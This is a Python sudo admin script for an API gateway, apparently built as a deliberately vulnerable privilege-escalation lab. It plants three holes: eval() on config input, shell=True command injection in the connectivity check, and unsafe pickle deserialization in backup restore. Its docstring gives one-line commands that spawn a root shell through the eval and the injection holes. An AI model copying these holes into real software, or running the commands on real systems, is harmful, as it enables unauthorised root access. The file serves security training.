#!/usr/bin/env python3
"""
API Gateway Admin Tool
======================
This script runs with sudo privileges via:
  sudo /usr/bin/python3 /opt/api/admin_tool.py <action> [args...]

VULNERABILITY: The 'update-config' action uses eval() on user input.
               The 'run-check' action passes args to subprocess with shell=True.
               The 'restore-backup' action uses pickle.loads (deserialization).
               
Privesc path:
  sudo /usr/bin/python3 /opt/api/admin_tool.py update-config '__import__("os").system("bash")'
  
  OR:
  sudo /usr/bin/python3 /opt/api/admin_tool.py run-check 'localhost; bash -i'
"""

import sys
import os
import subprocess
import sqlite3
import json
import pickle
import base64

DB_PATH = '/opt/api/data/gateway.db'

def show_help():
    print("""API Gateway Admin Tool v3.2.1
Usage: admin_tool.py <action> [arguments]

Actions:
  status              Show service status
  show-keys           List all API keys
  show-config         Show gateway configuration
  show-logs [N]       Show last N request logs (default 20)
  update-config K V   Update configuration key=value
  add-key KEY OWNER   Add a new API key
  run-check TARGET    Run connectivity check
  restore-backup DATA Restore config from backup data
  reset-db            Reset database to defaults
  help                Show this help
""")

def get_db():
    conn = sqlite3.connect(DB_PATH)
    conn.row_factory = sqlite3.Row
    return conn

def cmd_status():
    print("[*] API Gateway Status")
    print(f"    PID: {os.getpid()}")
    print(f"    UID: {os.getuid()}")
    print(f"    User: {os.environ.get('USER', 'unknown')}")
    print(f"    DB: {DB_PATH}")
    if os.path.exists(DB_PATH):
        print("    Database: OK")
    else:
        print("    Database: MISSING")

def cmd_show_keys():
    db = get_db()
    keys = db.execute('SELECT id, key, owner, role, is_active FROM api_keys').fetchall()
    db.close()
    print(f"{'ID':<4} {'Key':<25} {'Owner':<15} {'Role':<10} {'Active'}")
    print("-" * 70)
    for k in keys:
        print(f"{k['id']:<4} {k['key']:<25} {k['owner']:<15} {k['role']:<10} {k['is_active']}")

def cmd_show_config():
    db = get_db()
    config = db.execute('SELECT * FROM config').fetchall()
    db.close()
    for c in config:
        print(f"  {c['key']}: {c['value']}")

def cmd_show_logs(n=20):
    db = get_db()
    logs = db.execute('SELECT * FROM request_logs ORDER BY timestamp DESC LIMIT ?', (n,)).fetchall()
    db.close()
    for log in logs:
        print(f"  [{log['timestamp']}] {log['method']} {log['path']} -> {log['status_code']} from {log['ip_address']}")

def cmd_update_config(key, value):
    """VULNERABLE: Uses eval() to parse the value — allows arbitrary code execution"""
    db = get_db()
    try:
        # VULNERABLE: eval() on user-controlled input
        # The "intention" is to support Python expressions like True, False, None, dicts etc
        parsed_value = eval(value)
        actual_value = str(parsed_value)
    except:
        actual_value = value
    
    db.execute('INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)', (key, actual_value))
    db.commit()
    db.close()
    print(f"[+] Updated config: {key} = {actual_value}")

def cmd_add_key(key, owner):
    db = get_db()
    db.execute('INSERT INTO api_keys (key, owner, role) VALUES (?, ?, ?)', (key, owner, 'user'))
    db.commit()
    db.close()
    print(f"[+] Added API key for {owner}: {key}")

def cmd_run_check(target):
    """VULNERABLE: Command injection via shell=True"""
    print(f"[*] Checking connectivity to {target}...")
    try:
        # VULNERABLE: command injection
        result = subprocess.check_output(
            f"curl -s -o /dev/null -w '%{{http_code}}' http://{target} 2>&1 && echo ' OK' || echo ' FAIL'",
            shell=True, text=True, timeout=10
        )
        print(f"    Result: {result.strip()}")
    except subprocess.TimeoutExpired:
        print("    Result: TIMEOUT")
    except Exception as e:
        print(f"    Error: {e}")

def cmd_restore_backup(data):
    """VULNERABLE: Unsafe pickle deserialization"""
    try:
        raw = base64.b64decode(data)
        # VULNERABLE: pickle.loads on user-controlled data
        config = pickle.loads(raw)
        print(f"[+] Restored config: {config}")
        if isinstance(config, dict):
            db = get_db()
            for k, v in config.items():
                db.execute('INSERT OR REPLACE INTO config (key, value) VALUES (?, ?)', (k, str(v)))
            db.commit()
            db.close()
            print("[+] Config applied to database")
    except Exception as e:
        print(f"[-] Failed to restore: {e}")

def cmd_reset_db():
    print("[*] Resetting database...")
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
        print("[+] Database removed. Restart the service to reinitialize.")
    else:
        print("[-] Database not found")

def main():
    if len(sys.argv) < 2:
        show_help()
        return

    action = sys.argv[1]

    if action == 'help':
        show_help()
    elif action == 'status':
        cmd_status()
    elif action == 'show-keys':
        cmd_show_keys()
    elif action == 'show-config':
        cmd_show_config()
    elif action == 'show-logs':
        n = int(sys.argv[2]) if len(sys.argv) > 2 else 20
        cmd_show_logs(n)
    elif action == 'update-config':
        if len(sys.argv) < 4:
            print("Usage: admin_tool.py update-config <key> <value>")
            return
        cmd_update_config(sys.argv[2], sys.argv[3])
    elif action == 'add-key':
        if len(sys.argv) < 4:
            print("Usage: admin_tool.py add-key <key> <owner>")
            return
        cmd_add_key(sys.argv[2], sys.argv[3])
    elif action == 'run-check':
        if len(sys.argv) < 3:
            print("Usage: admin_tool.py run-check <target>")
            return
        cmd_run_check(sys.argv[2])
    elif action == 'restore-backup':
        if len(sys.argv) < 3:
            print("Usage: admin_tool.py restore-backup <base64-data>")
            return
        cmd_restore_backup(sys.argv[2])
    elif action == 'reset-db':
        cmd_reset_db()
    else:
        print(f"[-] Unknown action: {action}")
        show_help()

if __name__ == '__main__':
    main()
